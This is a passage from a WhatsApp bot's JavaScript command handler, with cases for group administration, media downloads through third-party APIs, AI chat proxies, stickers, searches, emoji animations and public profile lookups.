                    setTimeout(() => {
                        const close = fontx(`*On time*: The group is now closed by an admin\nOnly admins can send messages`);
                        conn.groupSettingUpdate(from, 'announcement');
                        reply(close);
                    }, timer);
                }
                break;
                case 'linkgroup':
                case 'gclink': {
                    if (!isGroup) return reply(mess.only.group);
                    if (!isGroupAdmins) return reply(mess.only.admin);
                    if (!isBotGroupAdmins) return reply(mess.only.Badmin);
                    let response = await conn.groupInviteCode(from)
                    conn.sendText(from, `https://chat.whatsapp.com/${response}\n\n${themeemoji} *Group link: ${groupMetadata.subject}*`, m, {
                        detectLink: true
                    })
                }
                break
                case 'antivirtex': {
                    if (!isGroup) return reply(mess.only.group);
                    if (!isGroupAdmins) return reply(mess.only.admin);
                    if (!isBotGroupAdmins) return reply(mess.only.Badmin);
                    await loading()
                    const mode = args[0]?.toLowerCase(); // Normalize input for case-insensitivity

                    if (["on", "enable", "1"].includes(mode)) {
                        if (isAntiVirtex) return reply("ANTIVIRTEX IS ALREADY ENABLED!");
                        db.data.chats[from].antivirtex = true;
                        reply("SUCCESSFULLY ENABLED ANTIVIRTEX!");
                    } else if (["off", "disable", "0"].includes(mode)) {
                        if (!isAntiVirtex) return reply("Antivirtex Is Already Disabled!");
                        db.data.chats[from].antivirtex = false;
                        reply("SUCCESSFULLY DISABLED ANTIVIRTEX!");
                    } else {
                        reply(`*ANTI VIRTEX MODE*\nUsage: ${prefix + command} on/off`);
                    }
                    break;
                }
                case 'antibot': {
                    if (!isGroup) return reply(mess.only.group);
                    if (!isGroupAdmins) return reply(mess.only.admin);
                    if (!isBotGroupAdmins) return reply(mess.only.Badmin);
                    await loading()
                    const mode = args[0]?.toLowerCase(); // Normalize input for case-insensitivity
                    if (!mode || !["on", "off"].includes(mode)) {
                        return reply(`*ANTI-BOT MODE*\nUsage: ${prefix + command} on/off`);
                    }

                    if (mode === "on") {
                        if (db.data.chats[from]?.antibot === true) return reply("ANTIBOT IS ALREADY ENABLED!");
                        db.data.chats[from].antibot = true;
                        reply("SUCCESSFULLY ENABLED ANTIBOT!");
                    } else if (mode === "off") {
                        if (db.data.chats[from]?.antibot === false) return reply("ANTIBOT IS ALREADY DISABLED!");
                        db.data.chats[from].antibot = false;
                        reply("SUCCESSFULLY DISABLED ANTIBOT!");
                    }
                    break;
                }
                case 'antiviewonce': {
                    if (!isGroup) return reply(mess.only.group);
                    if (!isGroupAdmins) return reply(mess.only.admin);
                    await loading()
                    const mode = args[0]?.toLowerCase(); // Normalize input for case-insensitivity
                    if (!mode || !["on", "off", "enable", "disable", "1", "0"].includes(mode)) {
                        return reply(`*viewonce mode*\n• ${prefix + command} on\n• ${prefix + command} off`);
                    }

                    if (["on", "enable", "1"].includes(mode)) {
                        if (isAntiViewOnce) return reply("The view Once feature is already enabled!");
                        db.data.chats[from].viewonce = true;
                        reply(`The ${command} feature has been successfully enabled.`);
                    } else if (["off", "disable", "0"].includes(mode)) {
                        if (!isAntiViewOnce) return reply(`The ${command} feature is already disabled!`);
                        db.data.chats[from].viewonce = false;
                        reply(`The ${command} feature has been successfully disabled.`);
                    }
                    break;
                }
                case 'yts': {
                    if (!q) return reply("Please provide a search query.");
                    await loading()

                    try {
                        const searchResults = await yts(q);
                        const videoResults = searchResults.all.filter((v) => v.type === 'video');
                        if (!videoResults || videoResults.length === 0) return reply("No videos found.");

                        const videoID = videoResults[0].videoId;
                        const thumbnail = `https://i.ytimg.com/vi/${videoID}/mqdefault.jpg`;

                        let responseMessage = `🔎 *YouTube Search Results:*\n`;
                        for (let video of videoResults) {
                            responseMessage += `
📜 *Title:* ${video.title}
📈 *Views:* ${video.views}
📅 *Uploaded:* ${video.ago}
⏱️ *Duration:* ${video.timestamp}
🎥 *Channel:* ${video.author.name}
🔗 *Link:* ${video.url}\n\n`;
                        }

                        // Send search results with the first video thumbnail
                        await conn.sendMessage(
                            from, {
                                caption: responseMessage.trim(),
                                image: {
                                    url: thumbnail
                                },
                            }, {
                                quoted: dev
                            }
                        );
                    } catch (error) {
                        console.error(error);
                        reply("An error occurred while fetching the YouTube search results.");
                    }
                    break;
                }
                case 'tiktok':
case 'tt': {
    if (!q) return reply(`\`No Tiktok link detected\`\nExample:  ${prefix + command} link`);
    await loading();

    try {
        // Fetching data from the new API
        const response = await fetchJson(`https://api-lenwy.vercel.app/tiktok?url=${encodeURIComponent(q)}`);
        const data = response.data;

        // Constructing the caption with the relevant information
        const caption = `*[ TIKTOK DOWNLOADER ]*

*Title*: _${data.title}_
*By*: _${data.creator}_

> 𝙿𝚘𝚠𝚎𝚛𝚎𝚍 𝚋𝚢 𝙱𝙻𝚄𝙴𝙳𝙴𝙼𝙾𝙽🐦‍🔥
`;

        // Sending the video with no watermark and the constructed caption
        conn.sendMessage(m.chat, {
            caption: caption,
            video: {
                url: data.no_watermark
            }
        }, { quoted: m });
    } catch (err) {
        console.error("Error fetching TikTok data:", err);
        reply("Error fetching the video. Please try again.");
    }

    break;
}
case 'ytmp4': {
    if (!q) {
        return reply(`\`No YouTube link detected\`\n*Example:  ${prefix + command} https://youtube.com/watch?v=wKfNaV-su-M*`)
    }

    await loading();

    try {
        const response = await fetch(`https://api.davidcyriltech.my.id/download/ytmp4?url=${encodeURIComponent(q)}`);
        const json = await response.json();

        if (!json.success || !json.result) {
            return conn.sendMessage(m.chat, { text: "Failed to fetch the video. Ensure the link is valid and try again." }, { quoted: m });
        }

        const { quality, title, thumbnail, download_url } = json.result;

        const captionText = fontx(`downloaded successfully a sec`);

        await conn.sendMessage(m.chat, {
            image: { url: thumbnail },
            caption: captionText
        }, { quoted: m });

        await conn.sendMessage(m.chat, {
            video: { url: download_url },
            caption: fontx(`🎬 *${title}*\n📹 Quality: ${quality}`),
            mimetype: 'video/mp4'
        }, { quoted: m });

    } catch (error) {
        console.error("Error in ytmp4 case:", error);
        conn.sendMessage(m.chat, { text: "An error occurred while processing your request. Please try again later." }, { quoted: m });
    }

    break;
}
case 'ytmp3': {
    if (!q) {
        return reply(`\`No YouTube link detected\`\n*Example:  ${prefix + command} https://youtube.com/watch?v=wKfNaV-su-M*`)
    }

    await loading();

    try {
        const response = await fetch(`https://api.davidcyriltech.my.id/download/ytmp3?url=${encodeURIComponent(q)}`);
        const json = await response.json();

        if (!json.success || !json.result) {
            return conn.sendMessage(m.chat, { text: "Failed to fetch the audio. Ensure the link is valid and try again." }, { quoted: m });
        }

        const { quality, title, thumbnail, download_url } = json.result;

        const captionText = fontx(`downloaded successfully a sec`);

        await conn.sendMessage(m.chat, {
            image: { url: thumbnail },
            caption: captionText
        }, { quoted: m });

        await conn.sendMessage(m.chat, {
            audio: { url: download_url },
            mimetype: 'audio/mpeg',
            fileName: `${title}.mp3`
        }, { quoted: m });

    } catch (error) {
        console.error("Error in ytmp3 case:", error);
        conn.sendMessage(m.chat, { text: "An error occurred while processing your request. Please try again later." }, { quoted: m });
    }

    break;
}
                case 'mediafire':
case 'mfdl': {
    if (args.length < 1) {
        return reply(`\`No Mediafire link detected\`\n*Example: ${prefix + command} https://www.mediafire.com/file/example/file.rar/file*`);
    }

    try {
        await loading();

        // Fetch the Mediafire file details using the API
        const apiUrl = `https://bk9.fun/download/mediafire?url=${encodeURIComponent(args.join(' '))}`;
        const response = await fetch(apiUrl);
        const res = await response.json();

        // Validate API response
        if (!res.status || !res.BK9) {
            return reply("Failed to fetch the Mediafire data. Please check the URL or try again later.");
        }

        const { link, name, filetype, size } = res.BK9;

        // Send the file details
        const captionx = `\`FILE DOWNLOADED SUCCESSFULLY\`

📄 *File Name:* ${name}  
📦 *File Type:* ${filetype}  
📏 *Size:* ${size}  

> ${caption}`;
        await conn.sendMessage(from, {
            document: { url: link }, // Download and send the file
            mimetype: "application/octet-stream", // Default mimetype for files
            fileName: name, // File name
            caption: captionx, // Caption with file details
        }, { quoted: m });

    } catch (error) {
        console.error("Error in mediafire case:", error);
        reply("An error occurred while processing your request. Please try again later.");
    }
    break;
}
                case 'githubdl':
                case 'gitclone': {
                    try {
                        if (!q) return reply(`\`No GitHub link detected\`\n*Example:  ${prefix + command} link without .git*`);

                        await loading();

                        // Make API request using the provided GitHub URL
                        let res = await fetchJson(`https://api.giftedtech.my.id/api/download/gitclone?apikey=gifted&url=${q}`);

                        if (res.status !== 200 || !res.success) {
                            return reply("Failed to fetch GitHub repository.");
                        }

                        const {
                            name,
                            download_url
                        } = res.result;

                        // Download the ZIP file using the download URL
                        const zipFile = await fetch(download_url);
                        const zipBuffer = await zipFile.buffer();

                        // Send the ZIP file to the user
                        await conn.sendMessage(from, {
                            document: zipBuffer,
                            mimetype: "application/zip",
                            fileName: `${name}.zip`
                        }, {
                            quoted: m
                        });

                    } catch (e) {
                        console.error(e);
                        reply("An error occurred while processing your request.");
                    }
                    break;
                }
                case 'block': {
                    if (!isOwner) return reply(mess.only.owner);
                    await loading()
                    let users;

                    if (isGroup) {
                        // In a group, block the sender of the quoted message or the number from the input text
                        if (m.quoted && m.quoted.sender) {
                            users = m.quoted.sender;
                        } else if (text) {
                            users = text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
                        }
                    } else {
                        // In a private chat, block the other person's number
                        users = m.chat;
                    }

                    if (users) {
                        // Ensure the number is not an empty string and contains valid characters
                        if (users.replace(/[^0-9]/g, '').length < 7) {
                            return reply('Invalid number. Please provide a valid number.');
                        }

                        // Block the user
                        await conn.updateBlockStatus(users, "block");
                        reply(mess.success);
                    } else {
                        reply("Please reply to the message or input the number you want to block.");
                    }
                    break;
                }
                case 'unblock': {
                    if (!isOwner) return reply(mess.only.group);

                    let users;

                    if (isGroup) {
                        // In a group, unblock the sender of the quoted message or the number from the input text
                        users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
                    } else {
                        // In a private chat, unblock the other person's number
                        users = m.chat;
                    }

                    if (users) {
                        // Ensure the number is not an empty string and contains valid characters
                        if (users.replace(/[^0-9]/g, '').length < 7) {
                            return reply('Invalid number. Please provide a valid number.');
                        }

                        // Unblock the user
                        await conn.updateBlockStatus(users, "unblock");
                        reply(mess.success);
                    } else {
                        reply("Please reply to the message or input the number you want to unblock.");
                    }
                    break;
                }
                case 'clearchat':
                case 'clear': {
                    if (!isOwner) return reply(mess.only.owner);

                    conn.chatModify({
                            delete: true,
                            lastMessages: [{
                                key: m.key,
                                messageTimestamp: m.messageTimestamp
                            }]
                        },
                        m.chat
                    );

                    reply(mess.success);
                }
                break;
                case 'join': {
                    if (!isOwner) return reply(mess.only.owner); // Check if the user is the owner
                    if (!text) return reply(`\`No Group link detected\`\n*Example:  ${prefix + command} link*`);
                    if (!isUrl(text) || !text.includes('chat.whatsapp.com')) return reply('`Invalid Link!`');

                    const result = text.split('https://chat.whatsapp.com/')[1];
                    await loading()
                    try {
                        await conn.groupAcceptInvite(result);
                    } catch (error) {
                        // Handle different error responses
                        if (error.response) {
                            switch (error.response.status) {
                                case 400:
                                    return reply('Group Not Found❗');
                                case 401:
                                    return reply('Bot Kicked From The Group❗');
                                case 409:
                                    return reply('Bot Has Already Joined the Group❗');
                                case 410:
                                    return reply('Group URL Has Been Reset❗');
                                case 500:
                                    return reply('Group Is Full❗');
                                default:
                                    return reply('An unknown error occurred.');
                            }
                        }
                        reply('An unexpected error occurred.');
                    }
                    break;
                }
                case 'leavegc':
                    if (!isGroup) return reply(mess.only.group)
                    if (!isOwner) return reply(mess.only.owner)
                    await loading()
                    await conn.groupLeave(from)
                    break
                case 'setname':
                case 'setbotname': {
                    if (!isOwner) return reply(mess.only.owner); // Restrict access to owners only
                    if (!text) return reply(`*Example: ${prefix + command} BLUE DEMON*`); // Ensure text is provided

                    try {
                        await conn.updateProfileName(text); // Update the bot's profile name
                        reply(`*SUCCESSFULLY CHANGED NAME TO \`${text}\`*`);
                    } catch (error) {
                        console.error(error);
                        reply("An error occurred while updating the name. Please try again.");
                    }
                    break;
                }

                case 'setbio':
                case 'setbotbio': {
                    if (!isOwner) return reply(mess.only.owner); // Restrict access to owners only
                    if (!q) return reply(`*Example: ${prefix + command} Text*`); // Ensure a bio text is provided

                    try {
                        await conn.updateProfileStatus(q); // Update the bot's profile bio/status
                        reply(`*BIO HAS BEEN CHANGED TO \`${q}\`*`);
                    } catch (error) {
                        console.error(error);
                        reply("An error occurred while updating the bio. Please try again.");
                    }
                    break;
                }
 case 's':
case 'sticker':
case 'take': {
    if (!m.quoted) {
        return reply(`*Reply to an image or video with the caption ${prefix + command}*\n> Video Duration: 1-9 Seconds`);
    }

    let mime = (m.quoted.msg || m.quoted).mimetype || '';

    try {
        if (/image/.test(mime)) {
            // Handle image sticker creation
            let media = await m.quoted.download();
            await conn.sendSticker(m.chat, media, m, {
                packname: `ᏰᏝᏬᏋ ᎴᏋᎷᎧᏁ`,
                author: 'V5'
            });
        } else if (/video/.test(mime)) {
            // Check video duration
            if ((m.quoted.msg || m.quoted).seconds > 9) {
                return reply(`*Video duration must be 1-9 seconds!*\nReply to a shorter video with ${prefix + command}`);
            }

            // Handle video sticker creation
            let media = await m.quoted.download();
            await conn.sendSticker(m.chat, media, m, {
                packname: packName || 'Sticker Pack',
                author: authorName || 'Bot'
            });
        } else {
            // Unsupported media type
            reply(`*Unsupported media type!*\nReply to an image or video with the caption ${prefix + command}\n> Video Duration: 1-9 Seconds`);
        }
    } catch (err) {
        console.error('Error creating sticker:', err);
        reply(`Failed to create sticker. Please try again.`);
    }
}
break;
                case 'gemini': {
    if (!q) return reply(`*Please provide a query.*\n\n*Example:* ${prefix + command} Hello, which model are you?`);

    await loading();

    try {
        // Construct API URL
        const apiUrl = `https://api-lenwy.vercel.app/ai4chat?text=${encodeURIComponent(q)}`;

        // Fetch AI response
        const response = await fetch(apiUrl);
        const res = await response.json();

        // Validate API response
        if (res.status !== 200 || !res.data) {
            return reply("Failed to process your request. Please try again later.");
        }

        // Send AI response with the image
        const aiResponse = res.data; // Extract response text
        await conn.sendMessage(from, {
            image: {
                url: './temp/blueimages/gemini.jpg' // Local image path
            },
            caption: fontx(`*Gemini AI Response:*\n\n${aiResponse}\n> ${caption}`),
        }, { quoted: m });
    } catch (error) {
        console.error("Error in Gemini case:", error);
        reply("An error occurred while processing your request. Please try again later.");
    }
    break;
}
case 'gemini2': {
    if (!q) {
        return reply(`*Please provide a query.*\n\n*Example:* ${prefix + command} Hello, which model are you?`);
    }

    await loading();

    try {
        // Construct API URL
        const apiUrl = `https://bk9.fun/ai/gemini?q=${encodeURIComponent(q)}`;

        // Fetch AI response
        const response = await fetch(apiUrl);
        const res = await response.json();

        // Validate API response
        if (!res.status || !res.BK9) {
            return reply("Failed to process your request. Please try again later.");
        }

        // Extract AI response text
        const aiResponse = res.BK9;

        // Send AI response with the image
        await conn.sendMessage(from, {
            image: {
                url: './temp/blueimages/gemini2.jpg' // Local image path
            },
            caption: fontx(`*Gemini AI V2 Response:*\n\n${aiResponse}\n> ${caption}`),
        }, { quoted: m });
    } catch (error) {
        console.error("Error in Gemini case:", error);
        reply("An error occurred while processing your request. Please try again later.");
    }
    break;
}
case 'gemini-pro': case 'ai': {
    if (!q) {
        return reply(`*Please provide a query.*\n\n*Example:* ${prefix + command} Hello, which model are you?`);
    }

    await loading();

    try {
        // Construct API URL
        const apiUrl = `https://bk9.fun/ai/acloudai?q=${encodeURIComponent(q)}`;

        // Fetch AI response
        const response = await fetch(apiUrl);
        const res = await response.json();

        // Validate API response
        if (!res.status || !res.BK9) {
            return reply("Failed to process your request. Please try again later.");
        }

        // Extract AI response text
        const aiResponse = res.BK9;

        // Send AI response with the image
        await conn.sendMessage(from, {
            image: {
                url: './temp/blueimages/geminipro.jpg' // Local image path
            },
            caption: fontx(`*Gemini pro Response:*\n\n${aiResponse}\n> ${caption}`),
        }, { quoted: m });
    } catch (error) {
        console.error("Error in Gemini-pro case:", error);
        reply("An error occurred while processing your request. Please try again later.");
    }
    break;
}
case 'blackbox': {
    if (!q) {
        return reply(`*Please provide a query.*\n\n*Example:* ${prefix + command} Hello, which model are you?`);
    }

    await loading();

    try {
    const prompt = "your name now is BLACKBOX AI, Question= "
        // Construct API URL
        const apiUrl = `https://bk9.fun/ai/acloudai?q=${encodeURIComponent(prompt)}${encodeURIComponent(q)}`;

        // Fetch AI response
        const response = await fetch(apiUrl);
        const res = await response.json();

        // Validate API response
        if (!res.status || !res.BK9) {
            return reply("Failed to process your request. Please try again later.");
        }

        // Extract AI response text
        const aiResponse = res.BK9;

        // Send AI response with the image
        await conn.sendMessage(from, {
            image: {
                url: './temp/blueimages/blackbox.jpg' // Local image path
            },
            caption: fontx(`*Blackbox Ai Response:*\n\n${aiResponse}\n> ${caption}`),
        }, { quoted: m });
    } catch (error) {
        console.error("Error in Blackbox case:", error);
        reply("An error occurred while processing your request. Please try again later.");
    }
    break;
}
                case 'chatgpt': {
    if (!q) {
        return reply(`*Please provide a query.*\n\n*Example:* ${prefix + command} Hello, which model are you?`);
    }

    await loading();

    try {
        // Construct API URL
        const apiUrl = `https://api-lenwy.vercel.app/ai4chat?text=${encodeURIComponent(q)}`;

        const response = await fetch(apiUrl);
        const res = await response.json();

        if (res.status !== 200 || !res.data) {
            return reply("Failed to process your request. Please try again later.");
        }
        const aiResponse = res.data;

        await conn.sendMessage(from, {
            image: {
                url: './temp/blueimages/chatgpt.jpg',
            },
            caption: fontx(`*ChatGPT Response:*\n\n${aiResponse}`),
        }, { quoted: m });

    } catch (error) {
        console.error("Error in ChatGPT case:", error);
        reply("An error occurred while processing your request. Please try again later.");
    }

    break;
}
case 'play':
case 'songs': {
    if (!text) {
        return reply(`\`No music title detected.\`\n*Example: ${prefix + command} Alan Walker - Faded*`);
    }

    try {
        await loading();
        let search = await yts(text);
        let video = search.videos[0];
        if (!video) {
            return reply("No results found for the provided query.");
        }

        let { title, timestamp, views, ago, url, thumbnail } = video;

        await conn.sendMessage(m.chat, {
            image: { url: thumbnail },
            caption: fontx(`🎶 *title:* ${title}\n👁️ *views:* ${views}\n⏱️ *duration:* ${timestamp}\n📅 *uploaded:* ${ago}\n🌐`) + (` *url:* ${url}\n`) + fontx(`\n> ${caption}`),
        });
        let apiUrl = `https://api.davidcyriltech.my.id/download/ytmp3?url=${encodeURIComponent(url)}`;
        let res;

        try {
            res = await fetch(apiUrl);
        } catch (fetchError) {
            console.error("Error fetching API:", fetchError);
            return reply("Failed to fetch audio. Please check your connection and try again.");
        }

        let json;
        try {
            json = await res.json();
        } catch (jsonError) {
            console.error("Error parsing JSON:", jsonError);
            return reply("Failed to process API response. Please try again later.");
        }

        // Validate API response
        if (!json.success || !json.result || !json.result.download_url) {
            return reply("Failed to fetch audio. Please try again later.");
        }

        let { download_url, title: audioTitle, quality } = json.result;

        await conn.sendMessage(m.chat, {
            audio: { url: download_url },
            mimetype: "audio/mp4",
            fileName: `${audioTitle} (${quality}).mp3`,
            caption: `🎶 *Title:* ${audioTitle}\n🔊 *Quality:* ${quality}\n📥 *Downloaded successfully!*`,
        }, { quoted: m });

    } catch (error) {
        console.error("Error in play case:", error);
        reply("An unexpected error occurred while processing your request. Please try again later.");
    }
    break;
}
case 'video': {
    if (!text) {
        return reply(`\`No video title detected.\`\n*Example: ${prefix + command} Alan Walker - Faded*`);
    }

    try {
        await loading();

        let search = await yts(text);
        let video = search.videos[0];
        if (!video) {
            return conn.sendMessage(m.chat, { text: "No results found for the provided query." }, { quoted: m });
        }

        let { title, timestamp, views, ago, url, thumbnail } = video;

        await conn.sendMessage(m.chat, {
            image: { url: thumbnail },
            caption: fontx(`🎬 *Title:* ${title}\ndownload completed a sec\n> ${caption}`),
        }, { quoted: m });

        let apiUrl = `https://api.davidcyriltech.my.id/download/ytmp4?url=${encodeURIComponent(url)}`;
        let res = await fetch(apiUrl);
        let json = await res.json();

        if (!json.success || !json.result || !json.result.download_url) {
            return conn.sendMessage(m.chat, { text: "Failed to fetch video. Please try again later." }, { quoted: m });
        }

        let { download_url, title: videoTitle, quality } = json.result;

        await conn.sendMessage(m.chat, {
            video: { url: download_url },
            caption: fontx(`> ${caption}`),
            mimetype: 'video/mp4'
        }, { quoted: m });

    } catch (error) {
        console.error("Error in video case:", error);
        conn.sendMessage(m.chat, { text: "An unexpected error occurred while processing your request. Please try again later." }, { quoted: m });
    }

    break;
}
                case 'lyrics': {
                    if (!text) return reply(`\`No song title detected.\`\n*Example: ${prefix + command} Spectre Alan Walker*`);
                    await loading();

                    try {
                        // Construct the API URL
                        let apiUrl = `https://api.giftedtech.my.id/api/search/lyrics?apikey=gifted&query=${encodeURIComponent(text)}`;

                        // Fetch the lyrics data
                        let res = await fetch(apiUrl);
                        let json = await res.json();

                        // Validate API response
                        if (json.status !== 200 || !json.success) {
                            return reply("Failed to fetch lyrics. Please try again later.");
                        }
                        let {
                            Artist,
                            Title,
                            Lyrics
                        } = json.result;
                        let message = fontx(`🎶 *Artist:* ${Artist}\n🎵 *Title:* ${Title}\n\n*Lyrics:*\n${readmore}${Lyrics}\n> ${caption}`);
                        await conn.sendMessage(from, {
                            image: {
                                url: './temp/blueimages/lyrics.jpg'
                            }, // Image path
                            caption: `${message}`,
                        }, {
                            quoted: m
                        });

                    } catch (error) {
                        console.error("Error in lyrics case:", error);
                        reply("An error occurred while processing your request. Please try again later.");
                    }
                    break;
                }
                case 'listcase': {
                    reply(listCase())
                }
                break
                case 'setppbot':
                case 'setpp': {
                    if (!isOwner) return reply(mess.only.owner)
                    await loading()
                    if (!quoted) return reply(`Send/Reply to Images With Caption ${prefix + command}`)
                    if (!/image/.test(mime)) return reply(`Send/Reply to Images With Caption ${prefix + command}`)
                    if (/webp/.test(mime)) return reply(`Send/Reply to Images With Caption ${prefix + command}`)
                    var medis = await conn.downloadAndSaveMediaMessage(quoted, 'ppbot.jpeg')
                    if (args[0] == `full`) {
                        var {
                            img
                        } = await generateProfilePicture(medis)
                        await conn.query({
                            tag: 'iq',
                            attrs: {
                                to: botNumber,
                                type: 'set',
                                xmlns: 'w:profile:picture'
                            },
                            content: [{
                                tag: 'picture',
                                attrs: {
                                    type: 'image'
                                },
                                content: img
                            }]
                        })
                        fs.unlinkSync(medis)
                        reply(mess.success)
                    } else {
                        var memeg = await conn.updateProfilePicture(botNumber, {
                            url: medis
                        })
                        fs.unlinkSync(medis)
                        reply(mess.success)
                    }
                }
                break
                case 'google': {
                    if (!text) return reply(`\`No search query detected.\`\n*Example: ${prefix + command} Gifted Md*`);

                    await loading()

                    try {
                        let apiUrl = `https://api.giftedtech.my.id/api/search/google?apikey=gifted&query=${encodeURIComponent(text)}`;
                        let res = await fetch(apiUrl);
                        let json = await res.json();

                        if (json.status !== 200 || !json.success || !json.results || json.results.length === 0) {
                            return reply("Failed to fetch results or no results found.");
                        }

                        let results = json.results.slice(0, 5); // Limit to 5 results for brevity
                        let message = `🌐 *Google Search Results*\n\n🔍 *Query:* ${text}\n\n`;

                        results.forEach((result, index) => {
                            message += `${themeemoji} *${index + 1}.* \`${result.title}\` ${result.url}\n${result.description}\n\n`;
                        });

                        message += `> ${caption}`;

                        await conn.sendMessage(from, {
                            image: {
                                url: './temp/blueimages/google.jpg'
                            },
                            caption: message,
                        }, {
                            quoted: m
                        });

                    } catch (error) {
                        console.error("Error in google case:", error);
                        reply("An error occurred while processing your request. Please try again later.");
                    }
                    break;
                }
                case 'happymod': {
                    if (!text) return reply(`\`No query detected.\`\n*Example: ${prefix + command} WhatsApp*`);

                    await loading();

                    try {
                        let apiUrl = `https://api.giftedtech.my.id/api/search/happymod?apikey=gifted&query=${encodeURIComponent(text)}`;
                        let res = await fetch(apiUrl);
                        let json = await res.json();

                        if (json.status !== 200 || !json.success || !json.results || !json.results.data) {
                            return reply("Failed to fetch results or no results found.");
                        }

                        let results = json.results.data.slice(0, 5); // Limit to 5 results for brevity
                        let message = `🎮 *HappyMod Search Results*\n\n🔍 *Query:* ${text}\n\n`;

                        results.forEach((result, index) => {
                            message += `${themeemoji} *${index + 1}.* *${result.name}*\n*Version:* ${result.version}\n[Download Here](${result.url})\n\n`;
                        });

                        message += `> ${caption}`;

                        await conn.sendMessage(from, {
                            image: {
                                url: './temp/blueimages/happymod.jpg'
                            },
                            caption: message,
                        }, {
                            quoted: m
                        });

                    } catch (error) {
                        console.error("Error in happymod case:", error);
                        reply("An error occurred while processing your request. Please try again later.");
                    }
                    break;
                }
                
                case 'hrt':
                case 'love': {

                    // Array of heart emojis to send one by one
                    const heartEmojis = [
                        '♥️', '❣️', '💘', '💝', '💖', '💗', '💓', '💞', '💕', '❤️‍🔥',
                        '❤️', '🧡', '💛', '💚', '💙', '💜', '🤎', '🖤', '🤍', '💕',
                        '🫀', '💓', '💝', '💞', '💓', '💘', '💗', '💝', '💓'
                    ];

                    // Send the initial message
                    const loveMsg = await conn.sendMessage(m.chat, {
                        text: heartEmojis[0]
                    }, {
                        quoted: m
                    });

                    // Function to update the message with new emojis
                    const updateMessage = async (index = 1) => {
                        if (index < heartEmojis.length) {
                            await conn.relayMessage(m.chat, {
                                protocolMessage: {
                                    key: loveMsg.key,
                                    type: 14,
                                    editedMessage: {
                                        conversation: heartEmojis[index]
                                    }
                                }
                            }, {});

                            // Schedule the next update after 2 seconds
                            setTimeout(() => updateMessage(index + 1), 1000);
                        }
                    };

                    // Start updating the message with heart emojis one by one
                    setTimeout(() => updateMessage(), 1000);
                    break;
                }
                case 'confuse':
                case 'conf': {
                    // Array of confused-themed emojis to send one by one
                    const confusedEmojis = [
                        '😕', '🤔', '😵', '😵‍💫', '🤷', '🤷‍♂️', '🤷‍♀️', '😮‍💨', '😐', '🤨',
                        '🙃', '😬', '😯', '😖', '😑', '😳', '🤪', '🤯'
                    ];

                    // Send the initial confused emoji
                    const confuseMsg = await conn.sendMessage(m.chat, {
                        text: confusedEmojis[0]
                    }, {
                        quoted: m
                    });

                    // Function to update the message with new confused emojis
                    const updateMessage = async (index = 1) => {
                        if (index < confusedEmojis.length) {
                            await conn.relayMessage(m.chat, {
                                protocolMessage: {
                                    key: confuseMsg.key,
                                    type: 14,
                                    editedMessage: {
                                        conversation: confusedEmojis[index]
                                    }
                                }
                            }, {});

                            // Schedule the next update after 2 seconds
                            setTimeout(() => updateMessage(index + 1), 1000);
                        }
                    };

                    // Start updating the message with confused emojis one by one
                    setTimeout(() => updateMessage(), 1000);
                    break;
                }
                case 'angry':
                case 'gtf': {
                    // Array of angry-themed stickers/emojis to send one by one
                    const angryEmojis = [
                        '😡', '😠', '🤬', '👿', '💢', '🔥', '😾', '😤', '🤯', '💥',
                        '😾', '👺', '👊', '🗯️', '😒', '👎', '🥵', '🧨', '👹', '💣',
                        '😠', '👊', '💥', '😡', '🤬', '🔥', '🖕🏽'
                    ];

                    // Send the initial angry emoji
                    const angryMsg = await conn.sendMessage(m.chat, {
                        text: angryEmojis[0]
                    }, {
                        quoted: m
                    });
                    const updateMessage = async (index = 1) => {
                        if (index < angryEmojis.length) {
                            await conn.relayMessage(m.chat, {
                                protocolMessage: {
                                    key: angryMsg.key,
                                    type: 14,
                                    editedMessage: {
                                        conversation: angryEmojis[index]
                                    }
                                }
                            }, {});
                            setTimeout(() => updateMessage(index + 1), 1000);
                        }
                    };
                    setTimeout(() => updateMessage(), 1000);
                    break;
                }
                case 'gitstalk': {
                    if (!text) return reply(`\`Please provide a GitHub username.\`\n*Example:* ${prefix + command} BLUEXDEMONl`);

                    await loading();

                    try {
                        const apiUrl = `https://api.giftedtech.my.id/api/stalk/gitstalk?apikey=gifted&username=${encodeURIComponent(text)}`;
                        const response = await fetch(apiUrl);
                        const json = await response.json();

                        if (json.status !== 200 || !json.success) {
                            return reply("Failed to fetch GitHub details. Please check the username and try again.");
                        }

                        const {
                            login,
                            avatar_url,
                            html_url,
                            name,
                            company,
                            location,
                            bio,
                            public_repos,
                            followers,
                            following,
                            created_at,
                            updated_at
                        } = json.result;

                        const message = `*GitHub User Details*\n\n` +
                            `👤 *Name:* ${name || 'N/A'}\n` +
                            `📂 *Username:* ${login}\n` +
                            `🏢 *Company:* ${company || 'N/A'}\n` +
                            `📍 *Location:* ${location || 'N/A'}\n` +
                            `📝 *Bio:* ${bio || 'N/A'}\n\n` +
                            `🔗 *Profile URL:* ${html_url}\n` +
                            `📦 *Public Repos:* ${public_repos}\n` +
                            `👥 *Followers:* ${followers}\n` +
                            `➡️ *Following:* ${following}\n\n` +
                            `📅 *Account Created:* ${new Date(created_at).toDateString()}\n` +
                            `🕒 *Last Updated:* ${new Date(updated_at).toDateString()}\n> ${caption}`;

                        await conn.sendMessage(from, {
                            image: {
                                url: avatar_url
                            },
                            caption: message,
                        }, {
                            quoted: m
                        });
                    } catch (error) {
                        console.error("Error in gitstalk case:", error);
                        reply("An error occurred while processing your request. Please try again later.");
                    }
                    break;
                }
                case 'wachannel': {
                    if (!text) return reply(`\`Please provide a WhatsApp Channel link.\`\n*Example:* ${prefix + command} https://whatsapp.com/channel/..`);

                    await loading();

                    try {
                        const apiUrl = `https://api.giftedtech.my.id/api/stalk/wachannel?apikey=gifted&url=${encodeURIComponent(text)}`;
                        const response = await fetch(apiUrl);
                        const json = await response.json();

                        if (json.status !== 200 || !json.success) {
                            return reply("Failed to fetch channel details. Please check the URL and try again.");
                        }

                        const {
                            img,
                            title,
                            followers,
                            description
                        } = json.result;

                        const message = `*WhatsApp Channel Details*\n\n` +
                            `📌 *Title:* ${title}\n` +
                            `👥 *Followers:* ${followers}\n\n` +
                            `📄 *Description:*\n${description}`;

                        await conn.sendMessage(from, {
                            image: {
                                url: img
                            },
                            caption: message,
                        }, {
                            quoted: m
                        });
                    } catch (error) {
                        console.error("Error in wachannel case:", error);
                        reply("An error occurred while processing your request. Please try again later.");
                    }
                    break;
                }
                case 'tiktokstalk': {
